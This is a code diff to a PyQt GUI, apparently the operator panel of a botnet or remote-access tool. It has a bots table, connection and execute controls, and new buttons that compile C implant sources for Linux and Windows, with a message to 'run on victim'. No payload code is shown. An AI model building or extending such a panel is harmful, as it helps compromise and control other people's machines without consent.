@@ -33,11 +33,10 @@ class WindowManager(QWidget):
 
         ## compile binary for linux or windows
         self.compileLabel = QLabel()
-        self.compile = QPushButton("Compile")
-        self.linux = QRadioButton("Linux")
-        self.windows = QRadioButton("Windows")
-        self.linux.toggled.connect(self.compileLinux)
-        self.windows.toggled.connect(self.compileWindows)
+        self.compileLinux = QPushButton("Compile for Linux")
+        self.compileWindows = QPushButton("Compile for Windows")
+        self.compileLinux.clicked.connect(self.compileForLinux)
+        self.compileWindows.clicked.connect(self.compileForWindows)
 
         ## add new connection button
         self.newConnectionButton = QPushButton("Add Connection")
@@ -117,9 +116,8 @@ class WindowManager(QWidget):
         layout.addWidget(self.console)
         layout.addWidget(self.execute)
         layout.addWidget(self.compileLabel)
-        layout.addWidget(self.linux)
-        layout.addWidget(self.windows)
-        layout.addWidget(self.compile)
+        layout.addWidget(self.compileLinux)
+        layout.addWidget(self.compileWindows)
 
         layout.setAlignment(Qt.AlignLeft)
         layout.setSpacing(5)
@@ -141,11 +139,13 @@ class WindowManager(QWidget):
         self.botsTable.setItem(self.botsCounter, 0, QTableWidgetItem(str(self.newConnection.text())))
         self.botsCounter += 1
 
-    def compileLinux(self):
-        print("Compiling for linux")
+    def compileForLinux(self):
+        self.console.setText("Check PWD for file linux, run on victim")
+        os.system("gcc main.c linux.c -o linux")
 
-    def compileWindows(self):
-        print("Compiling for Windows")
+    def compileForWindows(self):
+        self.console.setText("Check PWD for file windows, run on victim")
+        os.system("i686-w64-mingw32-gcc main.c windows.c -o windows.exe -lwsock32")
 
 if __name__ == '__main__':
     app = QApplication(sys.argv)
